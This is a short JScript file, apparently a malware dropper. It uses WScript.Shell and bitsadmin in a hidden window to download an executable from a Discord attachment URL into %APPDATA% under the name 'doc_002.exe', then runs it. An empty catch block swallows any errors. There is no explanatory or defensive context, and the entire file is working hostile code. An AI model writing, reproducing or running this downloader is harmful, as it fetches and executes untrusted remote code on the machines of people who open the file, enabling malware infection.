try {
var file = "%APPDATA%" + "\\doc_002.exe";
new ActiveXObject("WScript.Shell").run('bitsadmin.exe /transfer 8 https://cdn.discordapp.com/attachments/870961259946844193/871468771183841340/newfile.exe ' + file,0, true)
new ActiveXObject("WScript.Shell").run(file)
}
catch (e) {
}
